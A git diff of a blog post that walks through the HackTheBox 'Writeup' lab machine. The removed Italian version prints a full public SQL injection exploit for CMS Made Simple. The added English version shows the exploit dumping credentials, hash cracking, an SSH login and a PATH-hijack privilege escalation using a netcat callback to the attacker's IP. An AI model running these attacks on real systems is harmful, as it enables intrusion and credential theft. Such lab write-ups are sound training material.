@@ -1,311 +1,225 @@
 ---
 title: "Writeup - HackTheBox"
-date: 2019-07-15T17:39:53+02:00
+date: 2019-10-12T17:39:53+02:00
 tags:
     - "CTF"
     - "HackTheBox"
     - "SQL"
-draft: true
+    - "exploiting"
+draft: false
 ---
-Writeup è una macchina Linux su HackTheBox da 20 punti.
 
-![Writeup](/images/htb-writeup/writeup.png)
+Writeup is an easy Linux machine on HackTheBox. It's about enumeration and
+exploitation.
 
-Iniziamo con un rapido scan delle porte:
+# User
 
-![Writeup](/images/htb-writeup/nmap.png)
+As always, the first thing to do is a port scan with nmap:
+```
+$ nmap -A 10.10.10.138
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-12 14:29 EDT
+Nmap scan report for 10.10.10.138
+Host is up (0.060s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey:
+|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
+|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
+|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+| http-robots.txt: 1 disallowed entry
+|_/writeup/
+|_http-title: Nothing here yet.
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-Notiamo che c'è un web server in esecuzione sulla macchina, visitiamolo:
-![Pagina web](/images/htb-writeup/writeup-web.png)
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.23 seconds
+```
 
-Il codice sorgente non contiene niente di interessante, visitiamo la directory
-`/writeup` contenuta nel risultato dello scan di nmap:
-![Writeup directory](/images/htb-writeup/writeup-dir.png)
+Let's visit the web server:
 
-I link nella pagina portano ai seguenti URL:
+![Pagina web](/images/hackthebox/writeup/web.png)
+
+The website index does not contain anything interesting. Let's visit the
+`writeup` directory that `nmap` found in the `robots.txt` file:
+
+![Writeup directory](/images/hackthebox/writeup/web-writeup.png)
+
+The links in the list are to the following urls:
 ```
 http://10.10.10.138/writeup/index.php?page=ypuffy
 http://10.10.10.138/writeup/index.php?page=blue
 http://10.10.10.138/writeup/index.php?page=writeup
 ```
-che contengono solamente del testo.
+and they only contains text.
 
-Proviamo allora a lavorare sul parametro page. Inserendo come valore del
-parametro un'apice
-```
-http://10.10.10.138/writeup/index.php?page='
-```
-otteniamo una pagina 404 come risposta.
-
-![404](/images/htb-writeup/404.png)
-
-Provando con
-```
-http://10.10.10.138/writeup/index.php?page=/etc/passwd
-```
-otteniamo lo stesso risultato.
-
-Facciamo un passo indietro e vediamo se
-[Wappalyzer](/images/htb-writeup/https://www.wappalyzer.com/) (possiamo usare il plugin da browser)
-ci dà qualche informazione in più. Scopriamo infatti che questa parte di sito è
-realizzata tramite CMS Made Simple.
-
-![Wappalyzer](/images/htb-writeup/wappalyzer.png)
-
-Facendo una ricerca su internet troviamo che CMS Made Simple è vulnerabile a SQL
-Injection. Vediamo il codice dell'exploit:
-```python
-#!/usr/bin/env python
-# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
-# Date: 30-03-2019
-# Exploit Author: Daniele Scanu @ Certimeter Group
-# Vendor Homepage: https://www.cmsmadesimple.org/
-# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
-# Version: <= 2.2.9
-# Tested on: Ubuntu 18.04 LTS
-# CVE : CVE-2019-9053
-
-import requests
-from termcolor import colored
-import time
-from termcolor import cprint
-import optparse
-import hashlib
-
-parser = optparse.OptionParser()
-parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri (ex. http://10.10.10.100/cms)")
-parser.add_option('-w', '--wordlist', action="store", dest="wordlist", help="Wordlist for crack admin password")
-parser.add_option('-c', '--crack', action="store_true", dest="cracking", help="Crack password with wordlist", default=False)
-
-options, args = parser.parse_args()
-if not options.url:
-    print "[+] Specify an url target"
-    print "[+] Example usage (no cracking password): exploit.py -u http://target-uri"
-    print "[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist"
-    print "[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based."
-    exit()
-
-url_vuln = options.url + '/moduleinterface.php?mact=News,m1_,default,0'
-session = requests.Session()
-dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
-flag = True
-password = ""
-temp_password = ""
-TIME = 1
-db_name = ""
-output = ""
-email = ""
-
-salt = ''
-wordlist = ""
-if options.wordlist:
-    wordlist += options.wordlist
-
-def crack_password():
-    global password
-    global output
-    global wordlist
-    global salt
-    dict = open(wordlist)
-    for line in dict.readlines():
-        line = line.replace("\n", "")
-        beautify_print_try(line)
-        if hashlib.md5(str(salt) + line).hexdigest() == password:
-            output += "\n[+] Password cracked: " + line
-            break
-    dict.close()
-
-def beautify_print_try(value):
-    global output
-    print "\033c"
-    cprint(output,'green', attrs=['bold'])
-    cprint('[*] Try: ' + value, 'red', attrs=['bold'])
-
-def beautify_print():
-    global output
-    print "\033c"
-    cprint(output,'green', attrs=['bold'])
-
-def dump_salt():
-    global flag
-    global salt
-    global output
-    ord_salt = ""
-    ord_salt_temp = ""
-    while flag:
-        flag = False
-        for i in range(0, len(dictionary)):
-            temp_salt = salt + dictionary[i]
-            ord_salt_temp = ord_salt + hex(ord(dictionary[i]))[2:]
-            beautify_print_try(temp_salt)
-            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_siteprefs+where+sitepref_value+like+0x" + ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+"
-            url = url_vuln + "&m1_idlist=" + payload
-            start_time = time.time()
-            r = session.get(url)
-            elapsed_time = time.time() - start_time
-            if elapsed_time >= TIME:
-                flag = True
-                break
-        if flag:
-            salt = temp_salt
-            ord_salt = ord_salt_temp
-    flag = True
-    output += '\n[+] Salt for password found: ' + salt
-
-def dump_password():
-    global flag
-    global password
-    global output
-    ord_password = ""
-    ord_password_temp = ""
-    while flag:
-        flag = False
-        for i in range(0, len(dictionary)):
-            temp_password = password + dictionary[i]
-            ord_password_temp = ord_password + hex(ord(dictionary[i]))[2:]
-            beautify_print_try(temp_password)
-            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users"
-            payload += "+where+password+like+0x" + ord_password_temp + "25+and+user_id+like+0x31)+--+"
-            url = url_vuln + "&m1_idlist=" + payload
-            start_time = time.time()
-            r = session.get(url)
-            elapsed_time = time.time() - start_time
-            if elapsed_time >= TIME:
-                flag = True
-                break
-        if flag:
-            password = temp_password
-            ord_password = ord_password_temp
-    flag = True
-    output += '\n[+] Password found: ' + password
-
-def dump_username():
-    global flag
-    global db_name
-    global output
-    ord_db_name = ""
-    ord_db_name_temp = ""
-    while flag:
-        flag = False
-        for i in range(0, len(dictionary)):
-            temp_db_name = db_name + dictionary[i]
-            ord_db_name_temp = ord_db_name + hex(ord(dictionary[i]))[2:]
-            beautify_print_try(temp_db_name)
-            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+username+like+0x" + ord_db_name_temp + "25+and+user_id+like+0x31)+--+"
-            url = url_vuln + "&m1_idlist=" + payload
-            start_time = time.time()
-            r = session.get(url)
-            elapsed_time = time.time() - start_time
-            if elapsed_time >= TIME:
-                flag = True
-                break
-        if flag:
-            db_name = temp_db_name
-            ord_db_name = ord_db_name_temp
-    output += '\n[+] Username found: ' + db_name
-    flag = True
-
-def dump_email():
-    global flag
-    global email
-    global output
-    ord_email = ""
-    ord_email_temp = ""
-    while flag:
-        flag = False
-        for i in range(0, len(dictionary)):
-            temp_email = email + dictionary[i]
-            ord_email_temp = ord_email + hex(ord(dictionary[i]))[2:]
-            beautify_print_try(temp_email)
-            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+email+like+0x" + ord_email_temp + "25+and+user_id+like+0x31)+--+"
-            url = url_vuln + "&m1_idlist=" + payload
-            start_time = time.time()
-            r = session.get(url)
-            elapsed_time = time.time() - start_time
-            if elapsed_time >= TIME:
-                flag = True
-                break
-        if flag:
-            email = temp_email
-            ord_email = ord_email_temp
-    output += '\n[+] Email found: ' + email
-    flag = True
-
-dump_salt()
-dump_username()
-dump_email()
-dump_password()
-
-if options.cracking:
-    print colored("[*] Now try to crack password")
-    crack_password()
-
-beautify_print()
+Trying some basic fuzzing on the `page` parameter gives us only 404 pages. Even
+local file inclusion does not work.
+Let's take a step back and navigate through the source code of the website.
+In the `head` section there are references to `CMS made simple`
+```html
+<meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019. All rights reserved." />
 ```
 
-La vulnerabilità specifica di cui fa uso l'exploit si chiama Time Based Blind
-SQL Injection, e sfrutta la funzione `SLEEP` per introdurre un ritardo nel caso in
-cui le condizioni della query siano corrette. Trovate un approfondimento [qui](http://www.sqlinjection.net/time-based/).
+A quick search with `searchsploit` gives us a long list of exploits:
+```
+$ searchsploit cms made simple
+-------------------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                                        |  Path
+                                                                                      | (/usr/share/exploitdb/)
+-------------------------------------------------------------------------------------- ----------------------------------------
+CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)    | exploits/php/remote/46627.rb
+CMS Made Simple 0.10 - 'Lang.php' Remote File Inclusion                               | exploits/php/webapps/26217.html
+CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting                               | exploits/php/webapps/26298.txt
+CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site Scripting                            | exploits/php/webapps/29272.txt
+CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Injection                                | exploits/php/webapps/29941.txt
+CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities               | exploits/php/webapps/32668.txt
+CMS Made Simple 1.11.9 - Multiple Vulnerabilities                                     | exploits/php/webapps/43889.txt
+CMS Made Simple 1.2 - Remote Code Execution                                           | exploits/php/webapps/4442.txt
+CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                  | exploits/php/webapps/4810.txt
+CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload                      | exploits/php/webapps/5600.php
+CMS Made Simple 1.4.1 - Local File Inclusion                                          | exploits/php/webapps/7285.txt
+CMS Made Simple 1.6.2 - Local File Disclosure                                         | exploits/php/webapps/9407.txt
+CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting                   | exploits/php/webapps/33643.txt
+CMS Made Simple 1.6.6 - Multiple Vulnerabilities                                      | exploits/php/webapps/11424.txt
+CMS Made Simple 1.7 - Cross-Site Request Forgery                                      | exploits/php/webapps/12009.html
+CMS Made Simple 1.8 - 'default_cms_lang' Local File Inclusion                         | exploits/php/webapps/34299.py
+CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery               | exploits/php/webapps/34068.html
+CMS Made Simple 2.1.6 - Multiple Vulnerabilities                                      | exploits/php/webapps/41997.txt
+CMS Made Simple 2.1.6 - Remote Code Execution                                         | exploits/php/webapps/44192.txt
+CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                         | exploits/php/webapps/44976.py
+CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                         | exploits/php/webapps/45793.py
+CMS Made Simple < 1.12.1 / < 2.1.3 - Web Server Cache Poisoning                       | exploits/php/webapps/39760.txt
+CMS Made Simple < 2.2.10 - SQL Injection                                              | exploits/php/webapps/46635.py
+CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload                      | exploits/php/webapps/34300.py
+CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload                 | exploits/php/webapps/34298.py
+CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload        | exploits/php/webapps/46546.py
+-------------------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+```
+
+Given that the date of the copyright string is 2019, it must the most recent
+exploit, so let's download it with:
+```
+$ searchsploit -m 46635
+```
+
+Reading the code we can see that it exploits a SQL injection vulnerabilty in the
+`moduleinterface.php` file. More specifically, it's a time based blind SQL
+injection, you can find a good explanation
+[here](http://www.sqlinjection.net/time-based/).
 
 Eseguiamo allora l'exploit:
-![SQL](/images/htb-writeup/sql.gif)
-
-L'exploit ha trovato lo username, l'hash della password e il salt usato per
-l'hash dell'utente del pannello di amministrazione. Il formato dell'hash della
-password è MD5($SALT.$PASSWORD), usiamo allora hashcat in modalità dictionary
-attack usando la wordlist [rockyou](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt):
-![hashcat](/images/htb-writeup/hashcat.png)
-
-Quando hashcat finisce vediamo il risultato con questo comando:
-![hashcat](/images/htb-writeup/hashcat2.png)
-
-Proviamo ad usare i dati trovati per accedere tramite ssh:
-![ssh](/images/htb-writeup/ssh.png)
-
-# Root - Privilege escalation
-Adesso dobbiamo fare privilege escalation per diventare root. Uno dei primi tool
-che in genere si utilizzano è [LinEnum](https://github.com/rebootuser/LinEnum),
-che fa un'enumerazione generale del sistema. Deve essere eseguito sulla macchina
-che si vuole analizzare, però le macchine di HackTheBox non hanno accesso a
-internet. Cloniamo allora il repository sul nostro computer e copiamo il file
-con scp:
-![scp](/images/htb-writeup/scp.png)
-
-Eseguendolo sulla macchina non troviamo niente di interessante. Facciamo la
-stessa cosa con [pspy](https://github.com/DominicBreuker/pspy), un tool per
-monitorare i processi.
-
-Notiamo che ogni minuto viene eseguito lo script cleanup.pl.
-![pspy](/images/htb-writeup/pspy.png)
-
-Aspettando ancora non succede niente. Provando a connetterci con un altra
-sessione ssh vediamo che viene eseguito il comando
-```bash
-sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin: \
-/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
 ```
-![pspy2](/images/htb-writeup/pspy2.png)
+$ python2 46635.py -u http://10.10.10.138/writeup/
 
-Il comando `run-parts` esegue tutti i file presenti nella
-directory indicata e l'output viene rediretto in `/run/motd.dynamic.new`.
-Vediamo allora i permessi della directory contenente gli scripts e il loro
-contenuto:
-![update-motd](/images/htb-writeup/update-motd.png)
+[+] Salt for password found: 5a599ef579066807
+[+] Username found: jkr
+[+] Email found: jkr@writeup.htb
+[+] Password found: 62def4866937f08cc13bab43bb14e6f7
+```
 
-Lo script esegue il comando uname con alcuni parametri. Vediamo però che il
-comando run-parts viene chiamato anteponendo il comando `env -i`, che serve a
-ignorare le variabili di ambiente. Viene inoltre definita la variabile di
-ambiente `PATH`.  L'eseguibile `uname` viene cercato in tutte le directory a
-partire dalla prima. Vediamo se possiamo scrivere in una delle directory che
-vengono usate.
-![sbin](/images/htb-writeup/sbin.png)
+The exploit finds the username of the administration panel, the password hash
+and the salt used to hash the password. The hash format is `MD5($SALT.$PASSWORD)`
+, let's use `hashcat` to try to bruteforce it:
+```
+$ hashcat --force -m 20 hash.txt rockyou.txt
+```
 
-Abbiamo fortuna già con la prima! Scriviamo allora uno script in quella
-directory e chiamiamolo uname:
-![uname](/images/htb-writeup/uname.png)
+It only takes a couple of seconds with a gpu and the password is `raykayjay9`.
+Let's try the password on `ssh`:
 
-Salviamolo e diamogli i permessi di esecuzione con `chmod +x`. Connettiamoci di
-nuovo per far chiamare lo script e stampiamo il contenuto del file:
-![root](/images/htb-writeup/root.png)
+```
+$ ssh jkr@10.10.10.138
+The authenticity of host '10.10.10.138 (10.10.10.138)' can't be established.
+ECDSA key fingerprint is SHA256:TEw8ogmentaVUz08dLoHLKmD7USL1uIqidsdoX77oy0.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.138' (ECDSA) to the list of known hosts.
+jkr@10.10.10.138's password:
+Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux
 
-Alla prossima!
+The programs included with the Devuan GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+jkr@writeup:~$
+```
+
+And here's the flag:
+```
+jkr@writeup:~$ cat user.txt
+d4e493fd4068afc9eb1aa6a55319f978
+```
+
+# Root
+
+The first thing that I usually do is a basic local enumeration with tools like
+`LinEnum` and `pspy`. HackTheBox machines do not have internet access, so let's
+copy then on the machine with `scp`:
+```
+$ scp LinEnum jrk@10.10.10.138:~
+$ scp pspy64 jrk@10.10.10.138:~
+```
+
+`LinEnum` does not give us something interesting. At first, also `pspy` was not
+interesting. After a couple of minutes I connected using another `ssh`
+connection and something interesting popped out on `pspy`:
+
+
+![pspy](/images/hackthebox/writeup/pspy.png)
+
+This command gets executed on every `ssh` connection:
+```bash
+sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:\
+    /usr/sbin:/usr/bin:/sbin:/bin \
+    run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
+```
+
+The `run-parts` command runs every file present in the indicated directory,
+`/etc/update-motd.d` in our case, and the output of it gets written in
+`/run/motd.dynamic.new`.
+
+If we could write a script in `/etc/update-motd.d` then it's done! Let's check
+the permissions on the directory:
+```
+$ ls -la /etc/update-motd.d/
+total 12
+drwxr-xr-x  2 root root 4096 Apr 19 04:12 .
+drwxr-xr-x 81 root root 4096 Aug 23 05:16 ..
+-rwxr-xr-x  1 root root   23 Jun  3  2018 10-uname
+```
+
+Sadly, only `root` is allowed to write. Let's inspect `10-uname`:
+```bash
+#!/bin/sh
+uname -rnsom
+```
+It just runs the `uname` command. After a bit of thinking, I remembered that the
+command that gets executed on every ssh connection had a custom `PATH` variable,
+so I thought that if I can write an executable called `uname` in one of the
+directories, It could be executed instead of the original one. Luckily, the
+first one in the `PATH` variable is writeable by us:
+```
+jkr@writeup:~$ ls -lad /usr/local/sbin
+drwx-wsr-x 2 root staff 12288 Apr 19 04:11 /usr/local/sbin
+```
+
+Let's then write the file (`/usr/local/sbin/uname`) that will gets us a `root`
+connection using `netcat`
+```
+#!/bin/sh
+nc 10.10.14.25 1337
+```
+
+After saving it, give it execute permissions with `chmod +x` and run `nc -lnvp
+1337` on your machine to listen for the connection. After a successful `ssh`
+connection the custom `uname` script gets executed an we can read the flag:
+```
+$ cat /root/root.txt
+eeba47f60b48ef92b734f9b6198d7226
+```
+
+Thanks for the reading, see you in the next one!
